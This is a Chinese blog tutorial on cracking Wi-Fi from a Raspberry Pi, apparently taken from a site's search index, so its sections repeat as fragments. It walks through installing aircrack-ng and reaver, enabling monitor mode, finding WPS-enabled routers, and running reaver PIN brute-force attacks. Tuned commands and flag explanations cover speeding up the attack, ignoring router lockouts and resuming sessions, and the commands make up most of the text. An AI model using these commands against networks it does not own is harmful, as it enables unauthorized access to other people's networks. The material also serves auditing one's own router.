\u6811\u8393\u6d3eB+\u4e00\u4e2a\uff08\u6211\u7528\u7684\u662fdebian\u73af\u5883\uff09 PC\u4e00\u53f0\uff08\u6216\u5176\u5b83\u8bbe\u5907\u76f4\u63a5\u64cd\u4f5cPI\u5c31\u884c\uff09 \u65e0\u7ebf\u7f51\u5361\uff08\u80fd\u7528\u5c31\u884c\uff0c\u4e0d\u8fc7\u5f3a\u5927\u7684\u65e0\u7ebf\u7f51\u5361\u4f1a\u4e8b\u534a\u529f\u500d\uff0c\u6211\u7528\u76843070\uff09 Find\u6ce8\uff1a \u65e0\u7ebf\u7f51\u5361\u4e0d\u662f\u54ea\u4e2a\u90fd\u884c\uff0c\u9700\u8981\u652f\u6301\u76d1\u542c\u6a21\u5f0f\u624d\u53ef\u4ee5\uff0c\u652f\u6301\u5217\u8868\u53ef\u4ee5\u67e5\u770b\u8fd9\u91cc\uff1a https://wikidevi.com/wiki/Wireless_adapters/Chipset_table \u5b89\u88c5\u4f9d\u8d56\u5305 sudo apt-get install -y libpcap-dev libsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion ethtool sudo apt-get install -y libnl-3-200 libnl-3-dev libnl-genl-3-dev libnl-genl-3-200 \u5b89\u88c5aircarck-ng svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng cd aircrack-ng/ make sudo make install \u8fd8\u63d0\u793a\u4e86Run 'airodump-ng-oui-update' as root (or with sudo) to install or update Airodump-ng OUI file (Internet connection required). sudo airodump-ng-oui-update \u5b89\u88c5reaver wget http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz tar zxvf reaver-1.4.tar.gz cd reaver-1.4/src ./configure make sudo make install \u4ee5\u4e0a\u4e24\u4e2a\u8d44\u6e90\u5305\u90fd\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\uff1a \u767e\u5ea6\u7f51\u76d8\u5206\u4eab \u5982\u679c\u5b89\u88c5\u6210\u529f\u540e\uff0c\u4f1a\u6709 airmon-ng , airodump-ng , reaver \u7b49\u547d\u4ee4\u53ef\u7528\u3002 \u7834\u89e3\u6559\u7a0b sudo airmon-ng start wlan0 sudo airodump-ng mon0 \u6839\u636e\u4e0a\u9762\u7684airodump\u641c\u7d22\u5230\u7684\u65e0\u7ebf\u4fe1\u53f7\uff0c\u7136\u540e\u53ef\u4ee5\u6311\u4fe1\u53f7\u5f3a\u7684\u8fdb\u884c\u7834\u89e3\uff08\u6ce8\u610f\uff0c\u8981\u9009\u62e9\u5f00\u4e86WPS\u529f\u80fd\u7684\uff09 \u6ce8\u610f\u770b\u8fd9\u5f20\u5217\u8868\uff0c\u5217\u8868\u4e2d\u663e\u793a\u4e86\u4f60\u5468\u8fb9\u65e0\u7ebf\u7684\u76f8\u5173\u4fe1\u606f\u3002\u6ce8\u610f\u770b MB \u8fd9\u4e00\u5217\uff0c\u663e\u793a\u4e3a\" 54 \"\u3001\"54e. \"\u7b49\u7b49\uff0c\u8fd9\u8868\u793a\u4e86\u65e0\u7ebf\u5f53\u524d\u7684\u901f\u7387\u6a21\u5f0f\u4ee5\u53caWPS\u5f00\u542f\u72b6\u51b5\uff0c\u6211\u81ea\u5df1\u7684\u8def\u7531\u5668\u662f \"steve\"\uff0c\u6ce8\u610f\u770b\uff0c\u201d54e\u201c\u548c\u201d 54e. \u201c\u662f\u4e0d\u540c\u7684\uff0c\u591a\u4e86\u4e00\u4e2a \u70b9\uff0c\u8fd9\u4e2a\u70b9\u8868\u793a\u5f00\u542f\u4e86 wps\u6a21\u5f0f\u3002\u6240\u4ee5\u6211\u4eec\u4e0b\u9762\u5c31\u8fdb\u884cwps\u7684\u63a2\u6d4b\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u8981\u8bb0\u4f4fSSID\u5bf9\u5e94\u7684MAC\u5730\u5740\uff0c\u6b64\u540e\u6211\u4eec\u4f1a\u9488\u5bf9MAC\u5730\u5740\u8fdb\u884c\u653b\u51fb\u548c\u63a2\u6d4b\u3002 sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -vv \u662f\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f\u7684\uff0c\u7b49\u4f60\u719f\u7ec3\u4e86\u4e4b\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u4f7f\u7528 -v \uff0c\u8fd9\u6837\u5c31\u7b80\u5355\u4e86\u3002\u901a\u5e38\uff0c\u9047\u5230\u95ee\u9898\u624d\u4f1a\u4f7f\u7528 -vv \u3002 \u5982\u679c\u60f3\u6302\u673a\u7834\u89e3\uff0c\u8bb0\u5f97\u52a0\u4e0anohup\u547d\u4ee4\u540e\uff0c\u53ef\u4ee5\u65ad\u5f00ssh\u3002\u7136\u540e\u5269\u4e0b\u5c31\u662f\u7b49\u5f85\u3002 nohup sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -o fbi & -o \u53c2\u6570\u662f\u8f93\u51fa\u5230\u6587\u4ef6 \u5982\u679c\u7834\u89e3\u6210\u529f\u540e\uff0c\u6253\u5f00\u8f93\u51fa\u7684\u65e5\u5fd7\uff0c\u5c31\u53ef\u4ee5\u770b\u5230reaver\u51fa\u6765\u7684\u5bc6\u7801\u3002 \u547d\u4ee4\u8bf4\u660e\uff1a reaver \u4f7f\u7528\u65b9\u6cd5\uff1a airmon-ng start wlan0 //\u542f\u52a8mon0\u76d1\u63a7 reaver -i mon0 -b MAC -a -S -vv //\u666e\u901a\u7528\u6cd5 \u5982\u679c\uff0c90.9%\u8fdb\u7a0b\u540e\u6b7b\u673a\u6216\u505c\u673a\uff0c\u8bf7\u8bb0\u4e0bPIN\u524d\u56db\u4f4d\u6570\uff0c\u7528\u6307\u4ee4\uff1a reaver -i mon0 -b MAC -a -vv -p XXXX(PIN\u524d\u56db\u4f4d\u6570) \u5176\u4ed6\u547d\u4ee4 airodump-ng mon0 \u7528\u6765\u626b\u63cf\u5468\u56f4\u65e0\u7ebf\u4fe1\u53f7 wash -i mon0 -C \u8fd9\u4e2a\u662f\u7528\u6765\u68c0\u6d4b\u5468\u56f4\u65e0\u7ebf\u652f\u6301PIN\u7684\u8def\u7531 \u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u5c1d\u8bd5\u52a0-N\u53c2\u6570 reaver -i mon0 -b xx:xx:xx:xx:xx:xx -d 0 -vv -a -S -N \u4e5f\u53ef\u4ee5\u52a0\u5ef6\u65f6 -t 3 -b 3 \u5e38\u7528\u53c2\u6570\u91ca\u7591 -i \u76d1\u542c\u540e\u63a5\u53e3\u540d\u79f0 \u7f51\u5361\u7684\u76d1\u89c6\u63a5\u53e3\uff0c\u901a\u5e38\u662fmon0 -b \u76ee\u6807mac\u5730\u5740 AP\u7684MAC\u5730\u5740 -a \u81ea\u52a8\u68c0\u6d4b\u76ee\u6807AP\u6700\u4f73\u914d\u7f6e -S \u4f7f\u7528\u6700\u5c0f\u7684DH key\uff0c\u53ef\u4ee5\u63d0\u9ad8PJ\u901f\u5ea6 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a -d \u5373delay\u6bcf\u7a77\u4e3e\u4e00\u6b21\u7684\u95f2\u7f6e\u65f6\u95f4 \u9884\u8bbe\u4e3a1\u79d2 reaver -i mon0 -b MAC -d 0 \u7528\u4e0a\u8ff0\u6307\u4ee4\u53ef\u4ee5\u5927\u5e45\u52a0\u5febPJ\u901f\u5ea6 \u4f46\u662f\u6709\u4e9bAP\u53ef\u80fd\u53d7\u4e0d\u4e86 -c \uff08\u540e\u8ddf\u9891\u9053\u6570\uff09 \u6307\u5b9a\u9891\u9053,\u53ef\u4ee5\u65b9\u4fbf\u627e\u5230\u4fe1\u53f7 -p PIN\u7801\u56db\u4f4d\u6216\u516b\u4f4d //\u5df2\u77e5pin\u7801\u524d4\u4f4d\u53ef\u4ee5\u5e26\u6b64\u53c2\u6570\uff0c\u6307\u5b9a\u4ece\u8fd9\u4e2a\u6570\u5b57\u5f00\u59cbpin\u3002\u53ef\u4ee5\u75288\u4f4d\u76f4\u63a5\u627e\u5230\u5bc6\u7801\u3002 -N \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -n \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -t \u5373timeout\u6bcf\u6b21\u7a77\u4e3e\u7b49\u5f85\u53cd\u9988\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5982\u679c\u4fe1\u53f7\u4e0d\u9519\uff0c\u53ef\u4ee5\u8fd9\u6837###\u8bbe\u7f6e reaver -i mon0 -b MAC -d 0 -t .5 -m, --mac= \u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528 \u5c0f\u7ed3-PJ\u65f6\u5e94\u56e0\u72b6\u51b5\u8c03\u6574\u53c2\u6570: \u4fe1\u53f7 \u975e\u5e38\u597d: reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1 \u4fe1\u53f7\u666e\u901a: reaver -i mon0 -b MAC -a -S -vv -d .5 -t .5 -c 1 \u4fe1\u53f7\u4e00\u822c: reaver -i mon0 -b MAC -a -S -vv -c 1 \u5f53\u51fa\u73b0\u6709\u767e\u5206\u6570\u65f6\u4f60\u5c31\u53ef\u4ee5\u7528crtl+c\u6765\u6682\u505c\uff0c\u5b83\u4f1a\u5c06reaver\u7684\u8fdb\u5ea6\u8868\u6587\u4ef6\u4fdd\u5b58\u5728 1.3\u7248\uff1a /etc/reaver/MAC\u5730\u5740.wpc 1.4\u7248\uff1a /usr/local/etc/reaver/MAC\u5730\u5740.wpc \u7528\u8d44\u6e90\u7ba1\u7406\u5668\uff0c\u624b\u5de5\u5c06\u4ee5MAC\u5730\u5740\u547d\u540d\u7684\u3001\u540e\u8f8d\u4e3awpc\u7684\u6587\u4ef6\u62f7\u8d1d\u5230U\u76d8\u6216\u786c\u76d8\u4e2d\uff0c \u4e0b\u6b21\u91cd\u542f\u52a8\u540e\uff0c\u518d\u624b\u5de5\u590d\u5236\u5230/etc/reaver/ \u76ee\u5f55\u4e0b\u5373\u53ef\u3002 \u4e0d\u662f\u6240\u6709\u7684\u8def\u7531\u90fd\u652f\u6301pin\u5b66\u4e60\u3002AP\u5173\u95ed\u4e86WPS\u3001\u6216\u8005\u6ca1\u6709QSS\u6ef4\uff0c\u4f1a\u51fa\u73b0 WARNING: Failed to associate with XX:XX:XX:XX:XX:XX (ESSID: XXXX) \u5b66\u4e60\u8fc7\u7a0b\u4e2d\u4e5f\u53ef\u968f\u65f6\u968f\u5730\u6309Ctrl+C\u7ec8\u6b62PJ\uff0c\u91cd\u590d\u540c\u4e00\u4e2aPIN\u7801 \u6216 timeou t\u53ef\u7ec8\u6b62\uff0creaver\u4f1a\u81ea\u52a8\u4fdd\u5b58\u8fdb\u5ea6\u3002 \u7ee7\u7eed\u4e0a\u6b21\u7684PJ\uff0c\u5219\u518d\u6b21\u5728\u7ec8\u7aef\u4e2d\u53d1\u9001: reaver -i mon0 -b MAC -vv \u8fd9\u6761\u6307\u4ee4\u4e0b\u8fbe\u540e\uff0c\u4f1a\u8ba9\u4f60\u9009y\u6216n\uff0c\u9009y\u540e\u5c31\u7ee7\u7eed\u4e86 \u5f53reaver\u786e\u5b9a\u524d4\u4f4dPIN\u5bc6\u7801\u540e\uff0c\u5176\u5de5\u4f5c\u5b8c\u6210\u4efb\u52a1\u8fdb\u5ea6\u6570\u503c\u5c06\u76f4\u63a5\u8df3\u8dc3\u81f390.9%\u4ee5\u4e0a\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u5269\u4f59\u4e00\u5343\u4e2a\u5bc6\u7801\u7ec4\u5408\u4e86\uff08\u603b\u5171\u4e00\u4e07\u4e00\u5343\u4e2a\u5bc6\u7801\uff09\u3002 \u53c2\u6570\u8be6\u7ec6\u8bf4\u660e: -m, --mac= MAC of the host system \u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528 -e, --essid= ESSID of the target AP \u8def\u7531\u5668\u7684ESSID\uff0c\u4e00\u822c\u4e0d\u7528\u6307\u5b9a -c, --channel= Set the 802.11 channel for the interface (implies -f) \u4fe1\u53f7\u7684\u9891\u9053\uff0c\u5982\u679c\u4e0d\u6307\u5b9a\u4f1a\u81ea\u52a8\u626b\u63cf -o, --out-file= Send output to a log file [stdout] \u6807\u51c6\u8f93\u51fa\u5230\u6587\u4ef6 -s, --session= Restore a previous session file \u6062\u590d\u8fdb\u7a0b\u6587\u4ef6 -C, --exec= Execute the supplied command upon successful pin recovery pin\u6210\u529f\u540e\u6267\u884c\u547d\u4ee4 -D, --daemonize Daemonize reaver \u8bbe\u7f6ereaver\u6210Daemon -a, --auto Auto detect the best advanced options for the target AP \u5bf9\u76ee\u6807AP\u81ea\u52a8\u68c0\u6d4b\u9ad8\u7ea7\u53c2\u6570 -f, --fixed Disable channel hopping \u7981\u6b62\u9891\u9053\u8df3\u8f6c -5, --5ghz Use 5GHz 802.11 channels \u4f7f\u75285G\u9891\u9053 -v, --verbose Display non-critical warnings (-vv for more) \u663e\u793a\u4e0d\u91cd\u8981\u8b66\u544a\u4fe1\u606f -vv \u53ef\u4ee5\u663e\u793a\u66f4\u591a -q, --quiet Only display critical messages \u53ea\u663e\u793a\u5173\u952e\u4fe1\u606f -h, --help Show help \u663e\u793a\u5e2e\u52a9 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a \u9ad8\u7ea7\u53c2\u6570: -p, --pin= Use the specified 4 or 8 digit WPS pin \u76f4\u63a5\u8bfb\u53d6psk\uff08\u672c\u4eba\u6d4b\u8bd5\u672a\u6210\u529f\uff0c\u5efa\u8bae\u7528\u7f51\u5361\u81ea\u5e26\u8f6f\u4ef6\u83b7\u53d6\uff09 -d, --delay= Set the delay between pin attempts 1 pin\u95f4\u5ef6\u65f6\uff0c\u9ed8\u8ba41\u79d2\uff0c\u63a8\u8350\u8bbe0 -l, --lock-delay= Set the time to wait if the AP locks WPS pin attempts [60] AP\u9501\u5b9aWPS\u540e\u7b49\u5f85\u65f6\u95f4 -g, --max-attempts= Quit after num pin attempts \u6700\u5927pin\u6b21\u6570 -x, --fail-wait= Set the time to sleep after 10 unexpected failures [0] 10\u6b21\u610f\u5916\u5931\u8d25\u540e\u7b49\u5f85\u65f6\u95f4\uff0c\u9ed8\u8ba40\u79d2 -r, --recurring-delay= Sleep for y seconds every x pin attempts \u6bcfx\u6b21pin\u540e\u7b49\u5f85y\u79d2 -t, --timeout= Set the receive timeout period [5] \u6536\u5305\u8d85\u65f6\uff0c\u9ed8\u8ba45\u79d2 -T, --m57-timeout= Set the M5/M7 timeout period [0.20] M5/M7\u8d85\u65f6\uff0c\u9ed8\u8ba40.2\u79d2 -A, --no-associate Do not associate with the AP (association must be done by another application) \u4e0d\u8fde\u5165AP\uff08\u8fde\u5165\u8fc7\u7a0b\u5fc5\u987b\u6709\u5176\u4ed6\u7a0b\u5e8f\u5b8c\u6210\uff09 -N, --no-nacks Do not send NACK messages when out of order packets are received \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -S, --dh-small Use small DH keys to improve crack speed \u4f7f\u7528\u5c0fDH\u5173\u952e\u503c\u63d0\u9ad8\u901f\u5ea6\uff08\u63a8\u8350\u4f7f\u7528\uff09 -L, --ignore-locks Ignore locked state reported by the target AP \u5ffd\u7565\u76ee\u6807AP\u62a5\u544a\u7684\u9501\u5b9a\u72b6\u6001 -E, --eap-terminate Terminate each WPS session with an EAP FAIL packet \u6bcf\u5f53\u6536\u5230EAP\u5931\u8d25\u5305\u5c31\u7ec8\u6b62WPS\u8fdb\u7a0b -n, --nack Target AP always sends a NACK [Auto] \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -w, --win7 Mimic a Windows 7 registrar [False] \u6a21\u62dfwin7\u6ce8\u518c\uff0c\u9ed8\u8ba4\u5173\u95ed Reference http://lok.me/a/1972.html http://bao3.blogspot.com/2013/05/raspberry-pi.html http://tieba.baidu.com/p/2682878857 http://www.nyaboron.moe/posts/606.html \u6587\u7ae0\u7248\u6743\u5f52 FindHao \u6240\u6709\u4e28\u672c\u7ad9\u9ed8\u8ba4\u91c7\u7528CC-BY-NC-SA 4.0\u534f\u8bae\u8fdb\u884c\u6388\u6743| \u8f6c\u8f7d\u5fc5\u987b\u5305\u542b\u672c\u58f0\u660e\uff0c\u5e76\u4ee5\u8d85\u94fe\u63a5\u5f62\u5f0f\u6ce8\u660e\u4f5c\u8005 FindHao \u548c\u672c\u6587\u539f\u59cb\u5730\u5740\uff1a https://www.findhao.net/easycoding/1184.html","title":"\u6811\u8393\u6d3ewifi\u7834\u89e3\u6574\u7406   FindHao"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#wifi","text":"","title":"\u6811\u8393\u6d3ewifi\u7834\u89e3[\u6574\u7406]"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_1","text":"\u6811\u8393\u6d3eB+\u4e00\u4e2a\uff08\u6211\u7528\u7684\u662fdebian\u73af\u5883\uff09 PC\u4e00\u53f0\uff08\u6216\u5176\u5b83\u8bbe\u5907\u76f4\u63a5\u64cd\u4f5cPI\u5c31\u884c\uff09 \u65e0\u7ebf\u7f51\u5361\uff08\u80fd\u7528\u5c31\u884c\uff0c\u4e0d\u8fc7\u5f3a\u5927\u7684\u65e0\u7ebf\u7f51\u5361\u4f1a\u4e8b\u534a\u529f\u500d\uff0c\u6211\u7528\u76843070\uff09 Find\u6ce8\uff1a \u65e0\u7ebf\u7f51\u5361\u4e0d\u662f\u54ea\u4e2a\u90fd\u884c\uff0c\u9700\u8981\u652f\u6301\u76d1\u542c\u6a21\u5f0f\u624d\u53ef\u4ee5\uff0c\u652f\u6301\u5217\u8868\u53ef\u4ee5\u67e5\u770b\u8fd9\u91cc\uff1a https://wikidevi.com/wiki/Wireless_adapters/Chipset_table","title":"\u786c\u4ef6\u73af\u5883"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_2","text":"sudo apt-get install -y libpcap-dev libsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion ethtool sudo apt-get install -y libnl-3-200 libnl-3-dev libnl-genl-3-dev libnl-genl-3-200","title":"\u5b89\u88c5\u4f9d\u8d56\u5305"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#aircarck-ng","text":"svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng cd aircrack-ng/ make sudo make install \u8fd8\u63d0\u793a\u4e86Run 'airodump-ng-oui-update' as root (or with sudo) to install or update Airodump-ng OUI file (Internet connection required). sudo airodump-ng-oui-update","title":"\u5b89\u88c5aircarck-ng"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#reaver","text":"wget http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz tar zxvf reaver-1.4.tar.gz cd reaver-1.4/src ./configure make sudo make install \u4ee5\u4e0a\u4e24\u4e2a\u8d44\u6e90\u5305\u90fd\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\uff1a \u767e\u5ea6\u7f51\u76d8\u5206\u4eab \u5982\u679c\u5b89\u88c5\u6210\u529f\u540e\uff0c\u4f1a\u6709 airmon-ng , airodump-ng , reaver \u7b49\u547d\u4ee4\u53ef\u7528\u3002","title":"\u5b89\u88c5reaver"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_3","text":"sudo airmon-ng start wlan0 sudo airodump-ng mon0 \u6839\u636e\u4e0a\u9762\u7684airodump\u641c\u7d22\u5230\u7684\u65e0\u7ebf\u4fe1\u53f7\uff0c\u7136\u540e\u53ef\u4ee5\u6311\u4fe1\u53f7\u5f3a\u7684\u8fdb\u884c\u7834\u89e3\uff08\u6ce8\u610f\uff0c\u8981\u9009\u62e9\u5f00\u4e86WPS\u529f\u80fd\u7684\uff09 \u6ce8\u610f\u770b\u8fd9\u5f20\u5217\u8868\uff0c\u5217\u8868\u4e2d\u663e\u793a\u4e86\u4f60\u5468\u8fb9\u65e0\u7ebf\u7684\u76f8\u5173\u4fe1\u606f\u3002\u6ce8\u610f\u770b MB \u8fd9\u4e00\u5217\uff0c\u663e\u793a\u4e3a\" 54 \"\u3001\"54e. \"\u7b49\u7b49\uff0c\u8fd9\u8868\u793a\u4e86\u65e0\u7ebf\u5f53\u524d\u7684\u901f\u7387\u6a21\u5f0f\u4ee5\u53caWPS\u5f00\u542f\u72b6\u51b5\uff0c\u6211\u81ea\u5df1\u7684\u8def\u7531\u5668\u662f \"steve\"\uff0c\u6ce8\u610f\u770b\uff0c\u201d54e\u201c\u548c\u201d 54e. \u201c\u662f\u4e0d\u540c\u7684\uff0c\u591a\u4e86\u4e00\u4e2a \u70b9\uff0c\u8fd9\u4e2a\u70b9\u8868\u793a\u5f00\u542f\u4e86 wps\u6a21\u5f0f\u3002\u6240\u4ee5\u6211\u4eec\u4e0b\u9762\u5c31\u8fdb\u884cwps\u7684\u63a2\u6d4b\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u8981\u8bb0\u4f4fSSID\u5bf9\u5e94\u7684MAC\u5730\u5740\uff0c\u6b64\u540e\u6211\u4eec\u4f1a\u9488\u5bf9MAC\u5730\u5740\u8fdb\u884c\u653b\u51fb\u548c\u63a2\u6d4b\u3002 sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -vv \u662f\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f\u7684\uff0c\u7b49\u4f60\u719f\u7ec3\u4e86\u4e4b\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u4f7f\u7528 -v \uff0c\u8fd9\u6837\u5c31\u7b80\u5355\u4e86\u3002\u901a\u5e38\uff0c\u9047\u5230\u95ee\u9898\u624d\u4f1a\u4f7f\u7528 -vv \u3002 \u5982\u679c\u60f3\u6302\u673a\u7834\u89e3\uff0c\u8bb0\u5f97\u52a0\u4e0anohup\u547d\u4ee4\u540e\uff0c\u53ef\u4ee5\u65ad\u5f00ssh\u3002\u7136\u540e\u5269\u4e0b\u5c31\u662f\u7b49\u5f85\u3002 nohup sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -o fbi & -o \u53c2\u6570\u662f\u8f93\u51fa\u5230\u6587\u4ef6 \u5982\u679c\u7834\u89e3\u6210\u529f\u540e\uff0c\u6253\u5f00\u8f93\u51fa\u7684\u65e5\u5fd7\uff0c\u5c31\u53ef\u4ee5\u770b\u5230reaver\u51fa\u6765\u7684\u5bc6\u7801\u3002","title":"\u7834\u89e3\u6559\u7a0b"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_4","text":"","title":"\u547d\u4ee4\u8bf4\u660e\uff1a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#reaver_1","text":"","title":"reaver"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_5","text":"airmon-ng start wlan0 //\u542f\u52a8mon0\u76d1\u63a7 reaver -i mon0 -b MAC -a -S -vv //\u666e\u901a\u7528\u6cd5","title":"\u4f7f\u7528\u65b9\u6cd5\uff1a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#909pin","text":"reaver -i mon0 -b MAC -a -vv -p XXXX(PIN\u524d\u56db\u4f4d\u6570)","title":"\u5982\u679c\uff0c90.9%\u8fdb\u7a0b\u540e\u6b7b\u673a\u6216\u505c\u673a\uff0c\u8bf7\u8bb0\u4e0bPIN\u524d\u56db\u4f4d\u6570\uff0c\u7528\u6307\u4ee4\uff1a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_6","text":"airodump-ng mon0 \u7528\u6765\u626b\u63cf\u5468\u56f4\u65e0\u7ebf\u4fe1\u53f7 wash -i mon0 -C \u8fd9\u4e2a\u662f\u7528\u6765\u68c0\u6d4b\u5468\u56f4\u65e0\u7ebf\u652f\u6301PIN\u7684\u8def\u7531","title":"\u5176\u4ed6\u547d\u4ee4"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#pin-n","text":"reaver -i mon0 -b xx:xx:xx:xx:xx:xx -d 0 -vv -a -S -N \u4e5f\u53ef\u4ee5\u52a0\u5ef6\u65f6 -t 3 -b 3","title":"\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u5c1d\u8bd5\u52a0-N\u53c2\u6570"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_7","text":"-i \u76d1\u542c\u540e\u63a5\u53e3\u540d\u79f0 \u7f51\u5361\u7684\u76d1\u89c6\u63a5\u53e3\uff0c\u901a\u5e38\u662fmon0 -b \u76ee\u6807mac\u5730\u5740 AP\u7684MAC\u5730\u5740 -a \u81ea\u52a8\u68c0\u6d4b\u76ee\u6807AP\u6700\u4f73\u914d\u7f6e -S \u4f7f\u7528\u6700\u5c0f\u7684DH key\uff0c\u53ef\u4ee5\u63d0\u9ad8PJ\u901f\u5ea6 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a -d \u5373delay\u6bcf\u7a77\u4e3e\u4e00\u6b21\u7684\u95f2\u7f6e\u65f6\u95f4 \u9884\u8bbe\u4e3a1\u79d2 reaver -i mon0 -b MAC -d 0 \u7528\u4e0a\u8ff0\u6307\u4ee4\u53ef\u4ee5\u5927\u5e45\u52a0\u5febPJ\u901f\u5ea6 \u4f46\u662f\u6709\u4e9bAP\u53ef\u80fd\u53d7\u4e0d\u4e86 -c \uff08\u540e\u8ddf\u9891\u9053\u6570\uff09 \u6307\u5b9a\u9891\u9053,\u53ef\u4ee5\u65b9\u4fbf\u627e\u5230\u4fe1\u53f7 -p PIN\u7801\u56db\u4f4d\u6216\u516b\u4f4d //\u5df2\u77e5pin\u7801\u524d4\u4f4d\u53ef\u4ee5\u5e26\u6b64\u53c2\u6570\uff0c\u6307\u5b9a\u4ece\u8fd9\u4e2a\u6570\u5b57\u5f00\u59cbpin\u3002\u53ef\u4ee5\u75288\u4f4d\u76f4\u63a5\u627e\u5230\u5bc6\u7801\u3002 -N \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -n \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -t \u5373timeout\u6bcf\u6b21\u7a77\u4e3e\u7b49\u5f85\u53cd\u9988\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5982\u679c\u4fe1\u53f7\u4e0d\u9519\uff0c\u53ef\u4ee5\u8fd9\u6837###\u8bbe\u7f6e reaver -i mon0 -b MAC -d 0 -t .5 -m, --mac= \u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528","title":"\u5e38\u7528\u53c2\u6570\u91ca\u7591"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#-pj","text":"\u4fe1\u53f7 \u975e\u5e38\u597d: reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1 \u4fe1\u53f7\u666e\u901a: reaver -i mon0 -b MAC -a -S -vv -d .5 -t .5 -c 1 \u4fe1\u53f7\u4e00\u822c: reaver -i mon0 -b MAC -a -S -vv -c 1 